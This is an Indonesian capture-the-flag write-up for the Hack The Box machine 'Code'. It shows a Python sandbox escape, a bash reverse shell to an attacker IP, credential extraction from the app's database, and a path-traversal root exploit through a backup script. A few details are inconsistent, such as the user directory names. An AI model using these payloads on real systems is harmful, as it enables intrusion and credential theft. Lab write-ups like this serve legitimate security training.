## **Informasi Mesin**
- **Nama**: Code
- **Sistem Operasi**: Linux
- **Tingkat Kesulitan**: easy
- **Alamat IP**: 10.10.11.62
## **Tahap 1: Enumerasi Awal**

### **Pemindaian Jaringan**

```bash
rustscan -a 10.10.11.62 --ulimit 1000 -r 1-65535 -- -A -sC -Pn
```

**Hasil Pemindaian:**

- **Port 5000**: Gunicorn 20.0.4 hosting Python Code Editor
    

## **Tahap 2: Analisis Aplikasi Web**

### **Python Code Editor**

Aplikasi web pada port 5000 menyediakan:

- Python code editor online
    
- Fitur register/login
    
- Save functionality untuk code snippets
    
- Akses historical entries via parameter `code_id`
    

## **Tahap 3: Python Sandbox Escape**

### **Sandbox Environment Analysis**

Python sandbox membatasi akses ke:

- Module `os`, `sys`
    
- File system operations
    
- Subprocess execution
    

### **Sandbox Escape Technique**

Menggunakan Python introspection untuk bypass restrictions:

python

```python
# Akses builtin subclass
().__class__.__bases__[0].__subclasses__()
```

### **Remote Command Execution (RCE)**

Identifikasi `subprocess.Popen` pada index 317:

python

```python
# Reverse shell payload
().__class__.__bases__[0].__subclasses__()[317](
    ["/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.16.2/4444 0>&1"]
)
```

### **Execution via Curl**

```bash
curl -X POST "http://10.10.11.62:5000/runcode" \
  --data-urlencode "code=<payload>"
```

## **Tahap 4: Akses Awal dan Enumerasi**

### **Reverse Shell**

Setup listener:

```bash
nc -lvnp 4444
```

### **User Discovery**

```bash
ls /home
```

**Hasil:**

- `martin`
    
- `app-application`
    

### **User Flag**

```bash
cat /home/app-production/user.txt
```

User flag ditemukan di direktori web user.

## **Tahap 5: Code Review dan Credential Harvesting**

### **Analisis app.py**

File aplikasi utama mengungkap:

- SQLAlchemy ORM structure
    
- User authentication system
    
- Password hashing menggunakan MD5
    

### **Database Query Injection**

Mengekstrak kredensial user dari database:

```python
export inj='print(globals()["db"].session.query(globals()["User"]).all())'
curl -X POST "http://10.10.11.62:5000/runcode" --data-urlencode "code=$inj"
```

### **SSH Access ke Martin**

Menggunakan kredensial yang diekstrak untuk login SSH:

```bash
ssh martin@10.10.11.62
```

## **Tahap 6: Privilege Escalation**

### **Enumerasi Sudo Privileges**

```bash
sudo -l
```

### **Backup Script Analysis**

Ditemukan folder `backup` dengan script `backy.sh`:

```bash
ls -la /home/backup
cat /home/backup/backy.sh
```

### **Path Traversal Vulnerability**

Backup script memiliki kerentanan path traversal:

- Membackup direktori berdasarkan konfigurasi JSON
    
- Terbatas ke `/home` dan `/var` tetapi vulnerable ke path traversal
    

### **Craft Malicious JSON Config**

```json
{
    "target_dir": "/home/../../root",
    "backup_name": "root_backup"
}
```

### **Execute Backup Exploit**

```bash
sudo /home/backup/backy.sh
```

### **Extract Root Archive**

```bash
tar -xvjf *.tar.bz2
```

## **Tahap 7: Root Access**

### **Root Flag**

```bash
cat /root/root.txt
```

## **Kesimpulan**

Mesin Code HTB mengdemonstrasikan:

1. **Python Security** - Tantangan dalam implementasi secure sandbox
    
2. **Web Application Security** - Importance of proper input handling
    
3. **Credential Management** - Risks of weak password hashing
    
4. **Privilege Escalation** - Path traversal dalam system scripts
    

Pelajaran penting termasuk:

- Python sandboxes require extensive security measures
    
- Regular code review untuk identifikasi vulnerabilities
    
- Principle of least privilege untuk system operations
    
- Defense in depth security strategy